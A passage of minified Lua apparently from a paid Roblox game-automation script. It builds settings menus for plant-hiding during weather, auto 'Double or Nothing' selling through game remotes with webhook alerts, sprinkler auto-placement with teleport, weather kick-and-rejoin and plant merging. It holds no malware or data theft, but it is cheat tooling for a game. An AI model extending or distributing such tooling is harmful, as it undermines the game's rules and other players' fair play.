			Text = "= <font color=\'#7CFC00\'>Active Keep Overrides</font> =",
			DoesWrap = true
		})
		u()
	end
	if i then
		i:AddLabel({
			Text = "Stores selected grown plants during selected weather, then stacks matching pots back when the weather ends.";
			DoesWrap = true
		})
		local G
		G = i:AddValueDropdown("potted_weather_guard_selected_plants_ui", {
			Values = {};
			Default = {},
			Multi = true;
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\170\180 Plant Types",
			Tooltip = "Selected grown plants will be protected during the chosen weather.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.potted_weather_guard_selected_plants = G
				a.Save.SaveData()
			end
		})
		G:SetValues(Z.GardenItems.PottedPlantWeatherGuard.GetSelectedPlantDropdownPottedPlantWeatherGuard())
		G:SetValue(h.potted_weather_guard_selected_plants)
		local V = i:AddButton({
			Text = "\226\156\133 All";
			Func = function()
				h.potted_weather_guard_selected_plants = Z.PlantShovel.GetAllPlantTypeSelection()
				G:SetValue(h.potted_weather_guard_selected_plants)
				a.Save.SaveData()
			end
		})
		V:AddButton({
			Text = "\240\159\167\185 Clear",
			Func = function()
				h.potted_weather_guard_selected_plants = {}
				G:SetValue({})
				a.Save.SaveData()
			end
		})
		local y
		y = i:AddValueDropdown("potted_weather_guard_weather_selected_ui", {
			Values = Z.WeatherTriggers.GetDropdownWeatherTriggers(),
			Default = {};
			Multi = true,
			Searchable = true;
			MaxVisibleDropdownItems = 8,
			Text = "\240\159\140\166\239\184\143 Weather To Hide During",
			Tooltip = "Plants are stored while any selected weather or time cycle is active.";
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.potted_weather_guard_weather_selected = G
				a.Save.SaveData()
			end
		})
		y:SetValue(h.potted_weather_guard_weather_selected)
		i:AddDivider()
		local j
		j = i:AddInput("potted_weather_guard_fruit_min_kg_ui", {
			Text = "\226\154\150\239\184\143 Min Fruit Kg";
			Default = tostring(h.potted_weather_guard_fruit_min_kg);
			Numeric = false;
			AllowEmpty = false,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "0",
			Tooltip = "Only pick up plants with at least one matching fruit at or above this kg. Restore ignores this filter.";
			Callback = function(G)
				local V = f(G)
				if not V or V < 0 then
					g.Notify("Min fruit kg must be 0 or higher", 3)
					j:SetValue(tostring(h.potted_weather_guard_fruit_min_kg))
					return
				end
				h.potted_weather_guard_fruit_min_kg = V
				if tonumber(h.potted_weather_guard_fruit_max_kg) and h.potted_weather_guard_fruit_max_kg < V then
					h.potted_weather_guard_fruit_max_kg = V
				end
				a.Save.SaveData()
			end
		})
		local c
		c = i:AddInput("potted_weather_guard_fruit_max_kg_ui", {
			Text = "\226\154\150\239\184\143 Max Fruit Kg";
			Default = tostring(h.potted_weather_guard_fruit_max_kg);
			Numeric = false;
			AllowEmpty = false;
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "99";
			Tooltip = "Only pick up plants with at least one matching fruit at or below this kg. Restore ignores this filter.";
			Callback = function(G)
				local V = f(G)
				local y = tonumber(h.potted_weather_guard_fruit_min_kg) or 0
				if not V or V < y then
					g.Notify("Max fruit kg must be at least the min kg", 3)
					c:SetValue(tostring(h.potted_weather_guard_fruit_max_kg))
					return
				end
				h.potted_weather_guard_fruit_max_kg = V
				a.Save.SaveData()
			end
		})
		local J
		J = i:AddValueDropdown("potted_weather_guard_plant_mutations_ui", {
			Values = Z.GardenItems.PottedPlantWeatherGuard.GetPlantMutationDropdownPottedPlantWeatherGuard(),
			Default = {};
			Multi = true;
			Searchable = true;
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\167\172 Plant Mutations / Variants",
			Tooltip = "Only pick up plants with selected plant mutations or variants. Empty allows all.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.potted_weather_guard_plant_mutations = G
				a.Save.SaveData()
			end
		})
		J:SetValue(h.potted_weather_guard_plant_mutations)
		i:AddDivider()
		local T
		T = i:AddValueDropdown("potted_weather_guard_place_mode_ui", {
			Values = Z.Farm.GetPlacementModeOptionsFarm(true, {
				"Saved Location"
			}, {
				"Random"
			});
			Default = h.potted_weather_guard_place_mode or "Saved Location",
			Multi = false;
			Searchable = false,
			MaxVisibleDropdownItems = 8,
			Text = "\240\159\147\141 Restore Location",
			Tooltip = "Choose where matching pots are placed after the selected weather ends.";
			Callback = function(G)
				if type(G) ~= "string" or G == "" then
					return
				end
				h.potted_weather_guard_place_mode = G
				Z.GardenItems.PottedPlantWeatherGuard.ResetStackPlacementPottedPlantWeatherGuard()
				a.Save.SaveData()
			end
		})
		T:SetValue(h.potted_weather_guard_place_mode or "Saved Location")
		i:AddToggle("potted_weather_guard_place_same_spot_ui", {
			Text = "\240\159\147\140 Place In Same Place";
			Default = h.potted_weather_guard_place_same_spot == true;
			Tooltip = "For saved or fixed farm locations, place every pot in the same spot instead of stacking by Y step.";
			Callback = function(G)
				h.potted_weather_guard_place_same_spot = G == true
				Z.GardenItems.PottedPlantWeatherGuard.ResetStackPlacementPottedPlantWeatherGuard()
				a.Save.SaveData()
			end
		})
		local d = i:AddLabel({
			Text = Z.GardenItems.PottedPlantWeatherGuard.GetSavedCFrameTextPottedPlantWeatherGuard(),
			DoesWrap = true
		})
		i:AddButton({
			Text = "\240\159\147\140 Copy Current CFrame";
			Tooltip = "Stand where the stacked pots should be placed.";
			Func = function()
				local G, V = Z.GardenItems.PottedPlantWeatherGuard.SaveCurrentCFramePottedPlantWeatherGuard()
				g.Notify(V, 3)
				if G then
					h.potted_weather_guard_place_mode = "Saved Location"
					Z.GardenItems.PottedPlantWeatherGuard.ResetStackPlacementPottedPlantWeatherGuard()
					T:SetValue("Saved Location")
					d:SetText(Z.GardenItems.PottedPlantWeatherGuard.GetSavedCFrameTextPottedPlantWeatherGuard())
					a.Save.SaveDataSync()
				end
			end
		})
		local u
		u = i:AddInput("potted_weather_guard_max_per_cycle_ui", {
			Text = "\240\159\148\129 Max Per Cycle",
			Default = tostring(h.potted_weather_guard_max_per_cycle),
			Numeric = true,
			AllowEmpty = false;
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "3",
			Tooltip = "Maximum plants or pots handled each cycle.";
			Callback = function(G)
				local V = z(G)
				if not V or V < 1 or V > 25 then
					g.Notify("Max per cycle must be 1 to 25", 3)
					u:SetValue(tostring(h.potted_weather_guard_max_per_cycle))
					return
				end
				h.potted_weather_guard_max_per_cycle = V
				a.Save.SaveData()
			end
		})
		local q
		q = i:AddInput("potted_weather_guard_action_delay_ui", {
			Text = "\226\143\177\239\184\143 Pick / Place Delay";
			Default = tostring(h.potted_weather_guard_action_delay);
			Numeric = false;
			AllowEmpty = false;
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "0.3";
			Tooltip = "Delay between each pot pickup or placement.",
			Callback = function(G)
				local V = tonumber(G)
				if not V or V < .001 or V > 5 then
					g.Notify("Pot delay must be 0.001 to 5 seconds", 3)
					q:SetValue(tostring(h.potted_weather_guard_action_delay))
					return
				end
				h.potted_weather_guard_action_delay = V
				a.Save.SaveData()
			end
		})
		local E
		E = i:AddInput("potted_weather_guard_y_step_ui", {
			Text = "\226\134\149\239\184\143 Stack Y Step";
			Default = tostring(h.potted_weather_guard_y_step);
			Numeric = false;
			AllowEmpty = false,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "4",
			Tooltip = "Vertical spacing between stacked pots.",
			Callback = function(G)
				local V = tonumber(G)
				if not V or V < .5 or V > 25 then
					g.Notify("Y step must be 0.5 to 25", 3)
					E:SetValue(tostring(h.potted_weather_guard_y_step))
					return
				end
				h.potted_weather_guard_y_step = V
				Z.GardenItems.PottedPlantWeatherGuard.ResetStackPlacementPottedPlantWeatherGuard()
				a.Save.SaveData()
			end
		})
		i:AddDivider()
		local H = i:AddButton({
			Text = "\240\159\147\166 Pick All Potted Plants",
			Func = function()
				local G, V = Z.GardenItems.PottedPlantWeatherGuard.StartPickAllPottedPlantsPottedPlantWeatherGuard()
				g.Notify(V, 3)
			end
		})
		H:AddButton({
			Text = "\240\159\170\180 Place All Potted Plants";
			Func = function()
				local G, V = Z.GardenItems.PottedPlantWeatherGuard.StartPlaceAllPottedPlantsPottedPlantWeatherGuard()
				g.Notify(V, 3)
			end
		})
		i:AddButton({
			Text = "\226\143\185\239\184\143 Cancel Pot Action";
			Func = function()
				local G, V = Z.GardenItems.PottedPlantWeatherGuard.CancelManualActionPottedPlantWeatherGuard()
				g.Notify(V, 3)
			end
		})
		i:AddDivider()
		i:AddToggle("potted_weather_guard_enabled_ui", {
			Text = "\240\159\155\161\239\184\143 Enable Pot Weather Guard";
			Default = h.potted_weather_guard_enabled == true;
			Tooltip = "Protects selected plants during selected weather, then stacks them back after it ends.",
			Callback = function(G)
				h.potted_weather_guard_enabled = G == true
				Z.GardenItems.PottedPlantWeatherGuard.ResetStackPlacementPottedPlantWeatherGuard()
				if G and Z.GardenItems.PottedPlantWeatherGuard.ManualBusyPottedPlantWeatherGuard then
					Z.GardenItems.PottedPlantWeatherGuard.CancelManualPottedPlantWeatherGuard = true
				end
				if not G then
					g.PottedPlantWeatherGuardStatusText = ""
				end
				a.Save.SaveData()
			end
		})
	end
	if c then
		if not g.GetCheckIfPro() then
			c:AddLabel({
				Text = g.GetProMessage();
				DoesWrap = true
			})
		end
		c:AddLabel({
			Text = "Uses full backpack only. When enabled, normal Sell All is blocked so cash-out cannot reject because of sold fruits.",
			DoesWrap = true
		})
		local G
		local V
		local y = false
		local j = false
		local function i(V)
			if not G then
				return
			end
			local Z = math.clamp(math.floor(tonumber(V) or h.double_or_nothing_target_streak or 3), 1, 10)
			y = true
			G:SetValue(tostring(Z))
			G:SetText("\240\159\148\165 Target Streak: " .. tostring(Z))
			y = false
		end
		local function J(G)
			if not V then
				return
			end
			local y = math.clamp(tonumber(G) or h.double_or_nothing_roll_delay or .15, .001, 3)
			j = true
			V:SetValue(tostring(y))
			V:SetText("\226\154\161 Roll Delay: " .. (tostring(y) .. "s"))
			j = false
		end
		G = c:AddInput("double_or_nothing_target_streak_ui", {
			Text = "\240\159\148\165 Target Streak";
			Default = tostring(h.double_or_nothing_target_streak),
			Numeric = true,
			AllowEmpty = false,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "3",
			Tooltip = "Cashes out after this streak. Default is 3.",
			Callback = function(G)
				if y then
					return
				end
				local V = z(G)
				if not V or V < 1 or V > 10 then
					g.Notify("Streak must be between 1 and 10", 3)
					i(h.double_or_nothing_target_streak)
					return
				end
				h.double_or_nothing_target_streak = V
				i(V)
				a.Save.SaveData()
			end
		})
		i(h.double_or_nothing_target_streak)
		V = c:AddInput("double_or_nothing_roll_delay_ui", {
			Text = "\226\154\161 Roll Delay",
			Default = tostring(h.double_or_nothing_roll_delay),
			Numeric = false;
			AllowEmpty = false,
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "0.15";
			Tooltip = "Small delay between rolls. Increase if remotes reject.";
			Callback = function(G)
				if j then
					return
				end
				local V = tonumber(G)
				if not V or V < .001 or V > 3 then
					g.Notify("Delay must be between 0.01 and 3", 3)
					J(h.double_or_nothing_roll_delay)
					return
				end
				h.double_or_nothing_roll_delay = V
				J(V)
				a.Save.SaveData()
			end
		})
		J(h.double_or_nothing_roll_delay)
		local T
		T = c:AddToggle("double_or_nothing_enabled_ui", {
			Text = "\240\159\142\178 Enable Double or Nothing";
			Default = h.auto_double_or_nothing == true;
			Tooltip = "Runs on full backpack and blocks normal Sell All while active.",
			DisabledTooltip = g.GetProMessage(),
			Callback = function(G)
				h.auto_double_or_nothing = G == true
				if not G and Z.DoubleOrNothingSeller then
					Z.DoubleOrNothingSeller.SetStatusDoubleOrNothingSeller("")
				end
				a.Save.SaveData()
			end
		})
		T:SetDisabled(not g.GetCheckIfPro())
		c:AddToggle("double_or_nothing_webhook_win_ui", {
			Text = "\226\156\133 Webhook Wins";
			Default = h.double_or_nothing_webhook_win == true;
			Tooltip = "Sends a webhook after successful cash-out.";
			Callback = function(G)
				h.double_or_nothing_webhook_win = G == true
				a.Save.SaveData()
			end
		})
		c:AddToggle("double_or_nothing_webhook_loss_ui", {
			Text = "\240\159\146\165 Webhook Losses";
			Default = h.double_or_nothing_webhook_loss == true;
			Tooltip = "Sends a webhook when Double or Nothing busts.";
			Callback = function(G)
				h.double_or_nothing_webhook_loss = G == true
				a.Save.SaveData()
			end
		})
		c:AddDivider()
		local d = c:AddLabel({
			Text = Z.DoubleOrNothingSeller.GetLogsTextDoubleOrNothingSeller();
			DoesWrap = true
		})
		g.DoubleOrNothingUi.RefreshLogsDoubleOrNothingUi = function()
			if d and type(d.SetText) == "function" then
				d:SetText(Z.DoubleOrNothingSeller.GetLogsTextDoubleOrNothingSeller())
			end
		end
		c:AddButton({
			Text = "\240\159\167\185 Clear Logs";
			Func = function()
				table.clear(g.DoubleOrNothingLogs)
				g.DoubleOrNothingUi.RefreshLogsDoubleOrNothingUi()
				g.Notify("Double or Nothing logs cleared", 2)
			end
		})
	end
	if j then
		j:AddLabel({
			Text = "<b><font color=\'#FFD700\'>\226\173\144 Premium Ultra Mode</font></b>\n<font color=\'#7CFC00\'>Works:</font> fast fruit collection, farm details, fruit/plant counts, pets, shops, mail.\n<font color=\'#FFAA55\'>Limited:</font> shovel, trowel, plant-target water/sprinklers, seed spacing if plant protection is off.\n<font color=\'#FF5555\'>Important:</font> rejoin if plant models were already removed.",
			DoesWrap = true
		})
		j:AddToggle("premium_prevent_destroy_plants_ui", {
			Text = "\240\159\155\161\239\184\143 Don\'t Destroy Plants",
			Default = h.fruit_collect_prevent_destroy_plants;
			Tooltip = "Keeps plant models available for systems that need them while using premium speed mode.",
			DisabledTooptip = g.GetProMessage(),
			Callback = function(G)
				h.fruit_collect_prevent_destroy_plants = G
				a.Save.SaveData()
				if G then
					g.Notify("Plant protection enabled. Rejoin if plant models were already removed.", 4)
				end
			end
		})
		local G
		G = j:AddToggle("premiumperformancenolimit-", {
			Text = "<font color=\'#FF0000\'>\226\154\161 No Limits </font> <font color=\'#FF00C8\'>PRO</font>";
			Default = h.fruit_collect_nolimits;
			Tooltip = "This may cause lag. Set timers to lowest.",
			DisabledTooptip = g.GetProMessage();
			Callback = function(G)
				h.fruit_collect_nolimits = G
				a.Save.SaveData()
			end
		})
		local V
		V = j:AddToggle("premiumperformance-", {
			Text = "<font color=\'#FFD700\'>\240\159\154\128 Ultra Mode</font> <font color=\'#FF00C8\'>PRO</font>";
			Default = h.high_mode,
			Tooltip = "Premium speed mode for faster fruit collection. Plant models are kept when Don\'t Destroy Plants is enabled.",
			DisabledTooptip = g.GetProMessage(),
			Callback = function(G)
				h.high_mode = G
				a.Save.SaveDataSync()
				if G then
					g.Notify("Ultra Mode enabled. Some plant-target systems need models and may not work.", 4)
				else
					g.Notify("Ultra Mode disabled. Rejoin to bring plant models back.", 4)
				end
			end
		})
		local y = T.Options and T.Options.premium_prevent_destroy_plants_ui
		if y and type(y.SetDisabled) == "function" then
			y:SetDisabled(not g.GetCheckIfPro())
		end
		V:SetDisabled(not g.GetCheckIfPro())
		G:SetDisabled(not g.GetCheckIfPro())
	end
	if J then
		if not g.GetCheckIfPro() then
			J:AddLabel({
				Text = g.GetProMessage(),
				DoesWrap = true
			})
		end
		J:AddLabel({
			Text = "\240\159\146\161 Auto place sprinklers.",
			DoesWrap = true
		})
		local G
		G = J:AddValueDropdown("sprinkler_place_selected_ui", {
			Values = {},
			Default = {},
			Multi = true;
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\146\166 Sprinklers To Place";
			Tooltip = "Selected sprinklers will be kept at their target amount.";
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.sprinkler_place_selected = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValues(Z.SprinklerPlacer.GetDropdown())
		G:SetValue(h.sprinkler_place_selected)
		local V = J:AddButton({
			Text = "\226\156\133 All";
			Func = function()
				h.sprinkler_place_selected = Z.SprinklerPlacer.GetAllSelection()
				G:SetValue(h.sprinkler_place_selected)
				a.Save.SaveDataSync()
			end
		})
		V:AddButton({
			Text = "\240\159\167\185 Clear",
			Func = function()
				h.sprinkler_place_selected = {}
				G:SetValue({})
				a.Save.SaveDataSync()
			end
		})
		J:AddDivider()
		local y
		y = J:AddInput("sprinkler_place_default_target_ui", {
			Text = "\240\159\142\175 Default Target",
			Default = tostring(h.sprinkler_place_default_target),
			Numeric = true,
			AllowEmpty = true,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "Amount per sprinkler",
			Tooltip = "Places more when a selected sprinkler falls below this amount.",
			Callback = function(G)
				local V = z(G)
				if not V or V <= 0 then
					g.Notify("Target must be a whole number above 0", 3)
					y:SetValue(tostring(h.sprinkler_place_default_target))
					return
				end
				h.sprinkler_place_default_target = V
				a.Save.SaveDataSync()
			end
		})
		J:AddDivider()
		local j
		j = J:AddDropdown("sprinkler_place_mode_ui", {
			Values = Z.Farm.GetPlacementModeOptionsFarm(true, nil, {
				"Plant Target",
				"Saved Position"
			});
			Default = h.sprinkler_place_mode,
			Multi = false;
			Text = "\240\159\147\141 Placement Mode";
			Tooltip = "Choose where sprinklers should be placed.",
			Callback = function(G)
				if type(G) ~= "string" or G == "" then
					return
				end
				h.sprinkler_place_mode = G
				a.Save.SaveDataSync()
			end
		})
		j:SetValue(h.sprinkler_place_mode)
		local i
		i = J:AddValueDropdown("sprinkler_place_target_plant_ui", {
			Values = {};
			Default = "",
			Multi = false;
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\140\177 Target Plant",
			Tooltip = "Plant Target mode places sprinklers around this plant type.";
			Changed = function(G)
				if type(G) ~= "string" then
					return
				end
				h.sprinkler_place_target_plant = G
				a.Save.SaveDataSync()
			end
		})
		i:SetValues(Z.SeedData.GetSeedDataListDropDown())
		i:SetValue(h.sprinkler_place_target_plant)
		local c = J:AddLabel({
			Text = Z.SprinklerPlacer.GetSavedPositionText();
			DoesWrap = true
		})
		J:AddButton({
			Text = "\240\159\147\140 Copy Current Position",
			Tooltip = "Stand inside your farm where sprinklers should be placed.",
			Func = function()
				local G, V = Z.SprinklerPlacer.SaveCurrentPosition()
				g.Notify(V, 3)
				if G then
					h.sprinkler_place_mode = "Saved Position"
					j:SetValue("Saved Position")
					c:SetText(Z.SprinklerPlacer.GetSavedPositionText())
					a.Save.SaveDataSync()
				end
			end
		})
		J:AddDivider()
		local T
		T = J:AddValueDropdown("sprinkler_place_weather_selected_ui", {
			Values = Z.WeatherTriggers.GetDropdownWeatherTriggers(),
			Default = {},
			Multi = true;
			Searchable = true;
			MaxVisibleDropdownItems = 8,
			Text = "\240\159\140\166\239\184\143 Weather Trigger",
			Tooltip = "No selection allows any weather.";
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.sprinkler_place_weather_selected = G
				a.Save.SaveData()
			end
		})
		T:SetValue(h.sprinkler_place_weather_selected)
		J:AddToggle("sprinkler_place_weather_enabled_ui", {
			Text = "\240\159\140\166\239\184\143 Use Weather Trigger";
			Default = h.sprinkler_place_weather_enabled;
			Tooltip = "Only places sprinklers during selected weather or time cycle.",
			Callback = function(G)
				h.sprinkler_place_weather_enabled = G == true
				a.Save.SaveData()
			end
		})
		J:AddDivider()
		J:AddToggle("sprinkler_place_teleport_ui", {
			Text = "\240\159\147\161 Auto Teleport";
			Default = h.sprinkler_place_teleport,
			Tooltip = "Leave disabled to attempt placement from anywhere. Enable it to teleport near the placement position.",
			Callback = function(G)
				h.sprinkler_place_teleport = G
				if not G then
					Z.Teleport.UnlockTeleport(g.TeleportLockNames.SprinklerPlacer)
				end
				a.Save.SaveDataSync()
			end
		})
		local d
		d = J:AddToggle("sprinkler_replace_near_expiry_ui", {
			Text = "\240\159\148\129 Replace Near Expiry";
			Default = h.sprinkler_replace_near_expiry_enabled;
			Tooltip = "Places a replacement when a selected sprinkler has under 5 seconds left.";
			DisabledTooltip = g.GetProMessage(),
			Callback = function(G)
				h.sprinkler_replace_near_expiry_enabled = G == true
				a.Save.SaveDataSync()
			end
		})
		d:SetDisabled(not g.GetCheckIfPro())
		local u
		u = J:AddToggle("enable_sprinkler_placer_ui", {
			Text = "\240\159\146\166 Enable Sprinkler System";
			Default = h.auto_sprinkler_place;
			Tooltip = "Automatically places selected sprinklers when their amount is too low.",
			DisabledTooltip = g.GetProMessage(),
			Callback = function(G)
				h.auto_sprinkler_place = G
				if not G then
					Z.SprinklerPlacer.CleanupTool()
					Z.SprinklerPlacer.ClearStatus()
					Z.Teleport.UnlockTeleport(g.TeleportLockNames.SprinklerPlacer)
				end
				a.Save.SaveDataSync()
			end
		})
		u:SetDisabled(not g.GetCheckIfPro())
	end
	if r then
		local G = ""
		local V = math.max(math.floor(tonumber(h.sprinkler_place_default_target) or 1), 1)
		local y = false
		local j = {}
		local i = 0
		local c
		local J
		r:AddLabel({
			Text = "\240\159\146\161 Set a different target for individual sprinklers.",
			DoesWrap = true
		})
		local function T()
			for G, V in ipairs(j) do
				if V.Holder and typeof(V.Holder) == "Instance" then
					V.Holder:Destroy()
				end
			end
			table.clear(j)
			if r.Resize then
				r:Resize()
			end
		end
		local function d()
			local V = Z.SprinklerPlacer.GetOverrideTarget(G)
			if V ~= nil then
				return V
			end
			return math.max(math.floor(tonumber(h.sprinkler_place_default_target) or 1), 1)
		end
		local function u()
			if G == "" then
				return
			end
			V = d()
			y = true
			if c then
				c:SetValue(tostring(V))
				c:SetText(string.format("\240\159\142\175 Target Amount: <font color=\'#7CFC00\'>%d</font>", V))
			end
			if J then
				J:SetValue(Z.SprinklerPlacer.GetOverrideTarget(G) ~= nil)
			end
			y = false
		end
		local q
		q = function()
			T()
			i += 1
			local V = {}
			if type(h.sprinkler_place_overrides) == "table" then
				for G in pairs(h.sprinkler_place_overrides) do
					if Z.SprinklerPlacer.GetOverrideTarget(G) ~= nil then
						table.insert(V, G)
					end
				end
			end
			table.sort(V)
			if # V == 0 then
				local G = r:AddLabel({
					Text = "<font color=\'#888888\'>No active sprinkler overrides</font>";
					DoesWrap = true
				})
				table.insert(j, G)
			else
				for V, y in ipairs(V) do
					local c = Z.SprinklerPlacer.GetOverrideTarget(y)
					local J
					J = r:AddToggle(string.format("sprinkler_active_override_%d_%d", i, V), {
						Text = string.format("\240\159\146\166 %s <font color=\'#7CFC00\'>Target: %d</font>", y, c);
						Default = true;
						Tooltip = "Disable this sprinkler override.",
						Callback = function(V)
							if V then
								return
							end
							Z.SprinklerPlacer.RemoveOverrideTarget(y)
							a.Save.SaveDataSync()
							if G == y then
								u()
							end
							task.defer(q)
						end
					})
					table.insert(j, J)
				end
			end
			if r.Resize then
				r:Resize()
			end
		end
		local E
		E = r:AddValueDropdown("sprinkler_override_select_ui", {
			Values = {};
			Default = "",
			Multi = false,
			Searchable = true,
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\146\166 Select Sprinkler";
			Tooltip = "Select a sprinkler to configure its target.";
			Changed = function(V)
				if type(V) ~= "string" or V == "" then
					return
				end
				G = V
				u()
			end
		})
		E:SetValues(Z.SprinklerPlacer.GetDropdown())
		c = r:AddInput("sprinkler_override_target_ui", {
			Text = "\240\159\142\175 Target Amount";
			Default = tostring(V),
			Numeric = true,
			AllowEmpty = true;
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "Enter target amount";
			Tooltip = "Sets how many of this sprinkler should remain active.",
			Callback = function(j)
				if y then
					return
				end
				if G == "" then
					g.Notify("Select a sprinkler first", 3)
					return
				end
				local i = z(j)
				if not i or i <= 0 then
					g.Notify("Target must be above 0", 3)
					u()
					return
				end
				V = i
				c:SetText(string.format("\240\159\142\175 Target Amount: <font color=\'#7CFC00\'>%d</font>", V))
				if Z.SprinklerPlacer.GetOverrideTarget(G) ~= nil then
					Z.SprinklerPlacer.SetOverrideTarget(G, V)
					a.Save.SaveDataSync()
					q()
				end
			end
		})
		J = r:AddToggle("sprinkler_override_enable_ui", {
			Text = "\240\159\146\165 Enable Override";
			Default = false,
			Tooltip = "Use the custom target for the selected sprinkler.",
			Callback = function(j)
				if y then
					return
				end
				if G == "" then
					y = true
					J:SetValue(false)
					y = false
					g.Notify("Select a sprinkler first", 3)
					return
				end
				if j then
					if not Z.SprinklerPlacer.SetOverrideTarget(G, V) then
						y = true
						J:SetValue(false)
						y = false
						g.Notify("Failed to enable override", 3)
						return
					end
				else
					Z.SprinklerPlacer.RemoveOverrideTarget(G)
				end
				a.Save.SaveDataSync()
				u()
				q()
			end
		})
		r:AddDivider()
		r:AddLabel({
			Text = "= <font color=\'#7CFC00\'>Active Sprinkler Overrides</font> =",
			DoesWrap = true
		})
		q()
	end
end
g.GardenItemsUi = function()
	local G = d:AddTab({
		Name = "Garden Items",
		Description = "Collect garden drops";
		Icon = "package-open"
	})
	local V = G:AddLeftGroupbox("Auto Collect", "hand")
	local j = G:AddRightGroupbox("Weather Kick Rejoin", "cloud-lightning")
	local i = G:AddLeftGroupbox("Farm Positions", "map-pin")
	local c = G:AddRightGroupbox("Plant Merge", "git-merge")
	local J = G:AddRightGroupbox("Garden Expansion", "expand")
	local T = G:AddLeftGroupbox("Pet Max Inventory", "paw-print")
	if i then
		local G = i:AddValueDropdown("farm_default_placement_ui", {
			Values = Z.Farm.GetDefaultPlacementOptionsFarm(),
			Default = Z.Farm.GetDefaultPlacementFarm();
			Multi = false;
			Searchable = false,
			MaxVisibleDropdownItems = # W.Options;
			Text = "\240\159\147\141 Default placement",
			Tooltip = "Used whenever a system is set to Default Placement.",
			Callback = function(G)
				if not Z.Farm.IsDefaultPlacementFarm(G) then
					return
				end
				h.farm_default_placement = G
				Z.Seeder.StackIndex = 0
				if Z.FriendGardenCare and type(Z.FriendGardenCare.ResetProgressFriendGardenCare) == "function" then
					Z.FriendGardenCare.ResetProgressFriendGardenCare()
				end
				local V
				if Z.GardenItems then
					V = Z.GardenItems.PottedPlantWeatherGuard
				end
				if V and type(V.ResetStackPlacementPottedPlantWeatherGuard) == "function" then
					V.ResetStackPlacementPottedPlantWeatherGuard()
				end
				a.Save.SaveDataSync()
			end
		})
		G:SetValue(Z.Farm.GetDefaultPlacementFarm())
		local V = i:AddButton({
			Text = "\240\159\145\129\239\184\143 Show positions";
			Tooltip = "Shows every available farm placement on your garden.",
			Func = function()
				local G, V = Z.Farm.ShowPositionVisualsFarm()
				if G then
					g.Notify("Farm positions shown", 3)
				else
					g.Notify(tostring(V or "Farm positions unavailable"), 3)
				end
			end
		})
		V:AddButton({
			Text = "\240\159\167\185 Clear positions",
			Tooltip = "Removes the farm placement markers.",
			Func = function()
				Z.Farm.ClearPositionVisualsFarm()
			end
		})
	end
	if j then
		j:AddLabel({
			Text = "Kicks when selected weather is active.<br/>Waits until it ends, then rejoins if Rejoin is on.<br/>Works in public and private servers.",
			DoesWrap = true
		})
		local G
		G = j:AddValueDropdown("weather_kick_selected_ui", {
			Values = Z.WeatherKickRejoin.GetDropdownWeatherKickRejoin();
			Default = {},
			Multi = true,
			Searchable = true;
			MaxVisibleDropdownItems = 8,
			Text = "\240\159\140\166\239\184\143 Select Weathers",
			Tooltip = "Kicks when any selected weather becomes active.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.weather_kick_selected = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValue(h.weather_kick_selected)
		j:AddToggle("weather_kick_rejoin_enabled_ui", {
			Text = "\240\159\148\129 Rejoin";
			Default = h.weather_kick_rejoin_enabled == true,
			Tooltip = "Rejoins after the selected weather ends.";
			Callback = function(G)
				h.weather_kick_rejoin_enabled = G == true
				a.Save.SaveDataSync()
			end
		})
		j:AddToggle("weather_kick_enabled_ui", {
			Text = "\226\155\136\239\184\143 Auto Kick if Weather Detected";
			Default = h.weather_kick_enabled == true,
			Tooltip = "Kicks when selected weather is active.";
			Callback = function(G)
				h.weather_kick_enabled = G == true
				if h.weather_kick_enabled ~= true then
					g.WeatherKickRejoinStatusText = ""
				end
				a.Save.SaveDataSync()
				if G == true then
					Z.WeatherKickRejoin.CheckWeatherKickRejoin()
				end
			end
		})
	end
	if c then
		local G = Z.FruitFiltersDataSync
		local V = y.MergeFlags
		local j
		local i
		local J
		local T = false
		local d = 10
		local u = "\240\159\140\152 Select Two Plants"
		local function q()
			if type(G) ~= "table" then
				return {}
			end
			if G.Started ~= true and type(G.StartSync) == "function" then
				G.StartSync()
			end
			if type(G.SyncFromGarden) == "function" then
				G.SyncFromGarden(false, true)
			end
			if type(G.Plants) ~= "table" then
				return {}
			end
			return G.Plants
		end
		local function E()
			local G = tostring(j.Value or "")
			local y = tostring(i.Value or "")
			if G == "" or y == "" or G == y then
				return nil
			end
			local Z = q()
			local c = Z[G]
			local J = Z[y]
			if type(c) ~= "table" or type(J) ~= "table" then
				return nil
			end
			if type(V) ~= "table" or type(V.GetMergeResult) ~= "function" then
				return nil
			end
			local T = V.GetMergeResult(c.PlantName, J.PlantName)
			if type(T) ~= "string" or T == "" then
				return nil
			end
			return T, c, J, G, y
		end
		local function a(y)
			if type(V) ~= "table" or type(V.Recipes) ~= "table" or type(V.GetMergeResult) ~= "function" then
				return {}
			end
			local Z = q()
			local j = {}
			for G in pairs(V.Recipes) do
				local V, y = (tostring(G)):match("^(.-)%+(.+)$")
				if V and y then
					j[V] = true
					j[y] = true
				end
			end
			y = tostring(y or "")
			local i = Z[y]
			local c = type(i) == "table" and tostring(i.PlantName or "") or ""
			local J = {}
			for Z, i in pairs(Z) do
				Z = tostring(Z or "")
				local T = type(i) == "table" and tostring(i.PlantName or "") or ""
				if Z == "" or Z == y or type(i) ~= "table" or i.Removed == true or i.IsPotted == true or j[T] ~= true then
					continue
				end
				if c ~= "" and type(V.GetMergeResult(c, T)) ~= "string" then
					continue
				end
